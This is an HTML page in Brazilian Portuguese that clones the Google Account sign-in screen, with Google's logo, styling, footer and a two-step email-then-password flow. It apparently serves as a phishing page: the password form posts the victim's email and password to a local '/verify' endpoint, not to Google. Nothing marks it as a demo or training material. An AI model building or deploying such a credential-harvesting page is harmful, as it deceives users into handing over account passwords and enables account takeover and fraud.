<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <title>Fazer login nas Contas do Google</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: #fff;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            height: 100vh;
        }

        .box {
            border: 1px solid #dadce0;
            border-radius: 8px;
            width: 100%;
            max-width: 450px;
            padding: 48px 40px 36px;
            box-sizing: border-box;
            margin-top: 10vh;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .logo {
            width: 75px;
            margin-bottom: 16px;
        }

        h1 {
            font-weight: 400;
            font-size: 24px;
            margin: 0 0 10px;
            color: #202124;
        }

        .subtitle {
            font-size: 16px;
            color: #202124;
            margin-bottom: 40px;
        }

        .input-container {
            width: 100%;
            position: relative;
            margin-bottom: 10px;
        }

        input {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-sizing: border-box;
            outline: none;
        }

        input:focus {
            border: 2px solid #1a73e8;
            padding: 12px 14px;
        }

        .forgot {
            font-size: 14px;
            color: #1a73e8;
            font-weight: 500;
            cursor: pointer;
            text-align: left;
            width: 100%;
            margin-bottom: 40px;
            margin-top: 5px;
        }

        .guest-info {
            font-size: 14px;
            color: #5f6368;
            line-height: 1.5;
            width: 100%;
            margin-bottom: 40px;
        }

        .guest-info a {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
        }

        .actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 100%;
        }

        .create-account {
            color: #1a73e8;
            font-weight: 500;
            font-size: 14px;
            cursor: pointer;
        }

        .next-btn {
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }

        .next-btn:hover {
            background-color: #1557b0;
        }

        .footer {
            display: flex;
            justify-content: space-between;
            width: 100%;
            max-width: 450px;
            margin-top: 20px;
            font-size: 12px;
            color: #70757a;
        }

        .footer-links span {
            margin-left: 20px;
            cursor: pointer;
        }

        /* Step 2 specific styles */
        #step2 {
            display: none;
            width: 100%;
            text-align: center;
        }

        .profile-pill {
            border: 1px solid #dadce0;
            border-radius: 16px;
            display: inline-flex;
            align-items: center;
            padding: 5px 10px;
            font-size: 14px;
            font-weight: 500;
            color: #3c4043;
            margin-bottom: 40px;
            cursor: pointer;
        }

        .profile-pill svg {
            width: 20px;
            height: 20px;
            margin-right: 8px;
            color: #5f6368;
        }

        /* SVG Logo Google */
    </style>
</head>

<body>

    <div class="box">
        <!-- Google SVG Logo -->
        <svg class="logo" viewBox="0 0 924 304" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path
                d="M395.022 159.906C395.022 203.622 360.823 235.836 318.853 235.836C276.882 235.836 242.683 203.622 242.683 159.906C242.683 115.881 276.882 83.9752 318.853 83.9752C360.823 83.9752 395.022 115.881 395.022 159.906ZM361.679 159.906C361.679 132.587 341.858 113.895 318.853 113.895C295.848 113.895 276.026 132.587 276.026 159.906C276.026 186.95 295.848 205.916 318.853 205.916C341.858 205.916 361.679 186.916 361.679 159.906Z"
                fill="#EA4335" />
            <path
                d="M559.344 159.906C559.344 203.622 525.145 235.836 483.174 235.836C441.204 235.836 407.004 203.622 407.004 159.906C407.004 115.915 441.204 83.9752 483.174 83.9752C525.145 83.9752 559.344 115.881 559.344 159.906ZM526.001 159.906C526.001 132.587 506.179 113.895 483.174 113.895C460.169 113.895 440.348 132.587 440.348 159.906C440.348 186.95 460.169 205.916 483.174 205.916C506.179 205.916 526.001 186.916 526.001 159.906Z"
                fill="#FBBC05" />
            <path
                d="M716.819 88.5625V224.881C716.819 280.956 683.749 303.858 644.655 303.858C607.853 303.858 585.704 279.244 577.351 259.115L606.381 247.03C611.551 259.389 624.217 273.972 644.62 273.972C669.645 273.972 685.153 258.533 685.153 229.468V218.548H683.989C676.526 227.757 662.148 235.802 644.004 235.802C606.039 235.802 571.258 202.732 571.258 160.179C571.258 117.319 606.039 83.9752 644.004 83.9752C662.114 83.9752 676.492 92.0201 683.989 100.955H685.153V88.5968H716.819V88.5625ZM687.515 160.179C687.515 133.443 669.679 113.895 646.982 113.895C623.977 113.895 604.704 133.443 604.704 160.179C604.704 186.642 623.977 205.916 646.982 205.916C669.679 205.916 687.515 186.642 687.515 160.179Z"
                fill="#4285F4" />
            <path d="M769.025 8.66113V231.18H736.503V8.66113H769.025Z" fill="#34A853" />
            <path
                d="M895.759 184.896L921.639 202.15C913.286 214.508 893.157 235.802 858.375 235.802C815.241 235.802 783.027 202.458 783.027 159.871C783.027 114.717 815.515 83.941 854.644 83.941C894.047 83.941 913.321 115.299 919.62 132.245L923.077 140.872L821.574 182.911C829.345 198.145 841.43 205.916 858.375 205.916C875.355 205.916 887.132 197.563 895.759 184.896ZM816.097 157.578L883.948 129.403C880.217 119.921 868.988 113.314 855.774 113.314C838.828 113.314 815.241 128.274 816.097 157.578Z"
                fill="#EA4335" />
            <path
                d="M119.578 140.153V107.939H228.133C229.194 113.553 229.742 120.194 229.742 127.384C229.742 151.552 223.135 181.439 201.842 202.732C181.13 224.299 154.668 235.802 119.612 235.802C54.6369 235.802 0 182.876 0 117.901C0 52.9253 54.6369 0 119.612 0C155.558 0 181.165 14.1043 200.404 32.4878L177.673 55.2189C163.877 42.2786 145.185 32.2139 119.578 32.2139C72.1304 32.2139 35.0211 70.4529 35.0211 117.901C35.0211 165.349 72.1304 203.588 119.578 203.588C150.354 203.588 167.882 191.229 179.111 180.001C188.217 170.895 194.208 157.886 196.57 140.118L119.578 140.153Z"
                fill="#4285F4" />
        </svg>

        <h1 id="title">Fazer login</h1>
        <div class="subtitle" id="subtitle">Use sua Conta do Google</div>

        <!-- STEP 1: Email -->
        <div id="step1" style="width: 100%;">
            <div class="input-container">
                <input type="text" id="email" placeholder="E-mail ou telefone" autocomplete="off" autofocus>
            </div>
            <div class="forgot">Esqueceu seu e-mail?</div>
            <div class="guest-info">
                Não está em um computador que você usa? Use o modo Visitante para fazer login com privacidade. <a
                    href="#">Saiba mais</a>
            </div>
            <div class="actions">
                <div class="create-account">Criar conta</div>
                <button class="next-btn" onclick="nextStep()">Avançar</button>
            </div>
        </div>

        <!-- STEP 2: Password -->
        <div id="step2">
            <div class="profile-pill" onclick="prevStep()">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
                    <path
                        d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" />
                </svg>
                <span id="display-email"></span>
                <svg style="margin-left: 8px; margin-right: 0;" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"
                    fill="currentColor">
                    <path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z" />
                </svg>
            </div>

            <form action="/verify" method="POST" id="auth-form" style="width: 100%; text-align: left;">
                <input type="hidden" name="email" id="hidden-email">
                <div class="input-container">
                    <input type="password" name="password" id="password" placeholder="Digite sua senha" required>
                </div>
                <div class="forgot">Esqueceu a senha?</div>

                <div class="actions" style="margin-top: 40px;">
                    <div class="create-account" style="visibility: hidden;">Criar conta</div>
                    <button type="submit" class="next-btn">Avançar</button>
                </div>
            </form>
        </div>
    </div>

    <div class="footer">
        <div>Português (Brasil)</div>
        <div class="footer-links">
            <span>Ajuda</span>
            <span>Privacidade</span>
            <span>Termos</span>
        </div>
    </div>

    <script>
        function nextStep() {
            var email = document.getElementById('email').value;
            if (email.length > 3) {
                document.getElementById('title').innerText = "Bem-vindo";
                document.getElementById('subtitle').style.display = "none";
                document.getElementById('step1').style.display = "none";

                document.getElementById('display-email').innerText = email;
                document.getElementById('hidden-email').value = email;

                document.getElementById('step2').style.display = "block";
                document.getElementById('password').focus();
            }
        }
        function prevStep() {
            document.getElementById('title').innerText = "Fazer login";
            document.getElementById('subtitle').style.display = "block";
            document.getElementById('step1').style.display = "block";
            document.getElementById('step2').style.display = "none";
        }
    </script>
</body>

</html>
